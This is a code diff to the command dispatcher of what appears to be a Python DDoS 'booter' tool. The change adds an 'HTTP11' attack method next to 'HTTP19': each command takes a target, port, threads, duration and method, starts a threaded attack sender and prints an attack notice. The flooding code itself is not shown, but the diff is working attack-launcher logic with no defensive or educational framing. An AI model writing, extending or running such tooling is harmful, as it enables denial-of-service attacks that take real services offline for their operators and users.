@@ -106,12 +106,16 @@ def controler():
             threading.Thread(target=type_sender,args=('HTTP_QUERY',f'{target} {port} {thread} {times} {booters} {methods}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
            else:print(format_banner(languages['METHODS']['HTTPQUERY']))
-        elif a in ['HTTP19','HTTP_19','HTTP-19']:
+        elif a in ['HTTP19','HTTP_19','HTTP-19'] or a in ['HTTP11','HTTP_11','HTTP-11']:
            if len(com) == 6:
             target = com[1]; port = com[2]; times = com[3]; thread = com[4]; methods = com[5]
-            threading.Thread(target=type_sender,args=('HTTP_19',f'{target} {port} {thread} {times} {methods}')).start()
+            threading.Thread(target=type_sender,args=(a,f'{target} {port} {thread} {times} {methods}')).start()
             print(atk%(languages['DISPLAY']['ATTACK'],target,a))
-           else:print(format_banner(languages['METHODS']['HTTP19']))
+           else:
+               a2 = format_banner(languages['METHODS']['HTTP19'])
+               if a in ['HTTP11','HTTP_11','HTTP-11']:
+                 print(a2.replace('HTTP-19','HTTP-11'))
+               else:print(a2)
         elif a == 'PAPING':
            if len(com) == 5:
               ip = com[1]
